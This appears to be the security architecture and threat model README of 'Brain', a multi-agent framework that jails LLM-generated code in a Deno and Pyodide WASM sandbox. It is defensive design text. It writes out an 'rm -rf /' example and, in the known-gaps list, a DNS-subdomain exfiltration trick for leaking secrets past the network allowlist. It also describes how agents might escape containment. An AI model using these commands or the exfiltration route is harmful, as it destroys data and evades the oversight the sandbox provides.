# 🛡️ Brain - Security Architecture & Threat Model

Most autonomous multi-agent frameworks are highly vulnerable to prompt injections, remote code execution (RCE) loops, path traversals, and secret disclosures because they treat the agent execution environment as a trusted shell.

Brain **attempts** to solve this by enforcing **Shift-Left Perimeter Defense-in-Depth**. The architecture assumes that sub-agents *will* encounter malicious inputs and tokenized exploits. Instead of relying on fragile prompt engineering boundaries, the system stacks static code analysis, strict path proxying, out-of-process process supervision, and WebAssembly (WASM) V8 Isolate jailing to completely isolate the execution runtime.

---

## 🎯 Summary of Developer Protection Controls

| Security Vector | Risk Prevented | Underlying Implementation Subsystem |
| --- | --- | --- |
| **Command Injection & Exfiltration** | Reverse-shells, secret token scraping, and unauthorized network fetching. | **WebAssembly (WASM) Bridge**: Network capabilities mathematically severed via strict Deno flags (`--allow-net` whitelists only Pyodide CDNs). |
| **Malicious Scripts** | Dangerous system manipulation, root privilege escalation, or dynamic evaluation workarounds. | **Tier 1 Deno Isolate**: Syntax tree inspection backed by absolute WebAssembly virtualized execution containment. |
| **File Destruction & Path Traversal** | Arbitrary deletions, NTFS junction/symlink escapes, or out-of-bounds writing. | **Dynamic Path Proxies**: `DynamicDirectorySet` intercepts symlink bypasses *before* execution. Limits read/write strictly to `workspace_path`. |
| **Memory & Storage Flood (Pipe Bombs)** | Host OS Out-Of-Memory (OOM) crashes and disk storage exhaustion. | **Asynchronous Guillotines**: Active 5MB stream interceptors and 100MB disk inflation monitors violently kill runaway processes. |
| **JavaScript Bridge Escapes** | Agents escaping the WASM barrier to access the underlying V8 Node/Deno APIs. | **FFI Lobotomy**: Deep Python-to-JS bridge blackholing. Global objects (`Deno`, `fetch`, `Worker`) are permanently deleted. |

---

## 🏗️ Deep Dive: Defense-in-Depth Layers

#### The WebAssembly (WASM) Micro-Sandbox (`System/tools/sandbox.py` & `microsandbox/__init__.py`)

To prevent an agent from exploiting the host operating system, Brain dynamically routes untrusted logic through a **Deno V8 Isolate Bridge** running Pyodide (CPython compiled to WebAssembly). We enforce a rigorous 11-Proof Matrix (Mathematical Guillotines) to guarantee host safety:

* **Double Sandbox Paradigm:** Generated Python code does not execute via `sys.executable`. Instead, it executes *inside* a WASM memory boundary, which is itself trapped *inside* a Deno V8 isolate process.
* **Network Exfiltration Blackholing:** Network routing is violently restricted via native Deno flags (`--allow-net` and `--allow-import`). The runtime is physically prohibited from making outbound socket connections to unapproved servers (whitelisted strictly to `unpkg.com` and `cdn.jsdelivr.net` over port 443 for runtime hydration).
* **Virtual Emscripten Filesystem:** Even if a malicious script bypasses AST checks and calls `os.system("rm -rf /")`, the command is caught by the WASM virtual file system. The agent sees a sterile Emscripten disk (`/dev`, `/tmp`, `/home`), preventing it from interacting with the true host Mac, Linux, or Windows filesystem.
* **The FFI Lobotomy:** The Python-to-JavaScript Foreign Function Interface (FFI) is mathematically blackholed. Imports for `js` and `pyodide_js` are forced to `None`. The sandbox executes a secure pre-flight script that actively deletes `globalThis.Deno`, `globalThis.fetch`, `globalThis.Worker`, and `globalThis.postMessage` before yielding control to the agent.
* **The Pipe Bomb & Storage Guillotines:** Host resource starvation is prevented via concurrent OS monitors. The `MAX_BYTES` accumulator severs the process if the output stream exceeds 5MB, preventing infinite print loops. The disk watcher measures byte-weight at launch and violently kills the isolate if directory inflation exceeds 100MB.
* **Cryptographic Execution Signals:** Because WASM can leave dangling asynchronous event loops, the execution stream emits a unique `[__EXECUTION_COMPLETE__]` intercept token upon script completion. The host Orchestrator listens for this atomic signal and securely assassinates the worker pool process to prevent zombie threads.
* **Hardware Memory & Environment Ceilings:** The environment is stripped via `env={"NO_COLOR": "1"}` (merging only required Winsock/DNS drivers on Windows). The V8 engine itself is capped at 256MB of old-space memory and 4096 WASM memory pages via `--v8-flags`.
* **Fail-Closed Design:** If the required isolation engine (Deno) is missing, the master execution router fails closed (`CRITICAL SECURITY TERMINATION`), refusing to run untrusted code natively.

---

## ⚠️ Known Gaps & Honest Limitations

While the containment matrix provides military-grade sandboxing for generated code, true autonomy brings inherent risks. To remain completely transparent, these are the known theoretical gaps in the current security model:

1. **DNS-Based Data Exfiltration:** While `--allow-net` strictly locks HTTP traffic to Pyodide CDNs, Deno still relies on the host OS for DNS resolution. Highly sophisticated malware generated by the LLM could theoretically encode secrets into forged subdomains (e.g., `fetch("https://my-stolen-secret.unpkg.com")`). While the connection will fail, the DNS lookup will broadcast the secret in plaintext to the local network router.
2. **Denial of Service (DoS) of the Agent Loop:** An agent can easily trap itself in an infinite `while True:` loop. While our 60-second timeout guillotine guarantees the host OS is unharmed, the agent will waste its turn, requiring self-healing retries that burn LLM API tokens.
3. **No Live Network Capabilities:** Because the container is mathematically offline, agents *cannot* run code like `requests.get("https://api.github.com")` from within the sandbox. If an agent needs live network data, it must use the Orchestrator's native routing tools (like the Web Receptor) rather than writing its own network-fetching Python scripts.
4. **Side-Channel Timing Attacks:** The V8 isolate still shares the physical CPU with the host. Theoretical CPU timing side-channel attacks (like Spectre) remain a highly improbable, but mathematically nonzero, risk against the host memory.
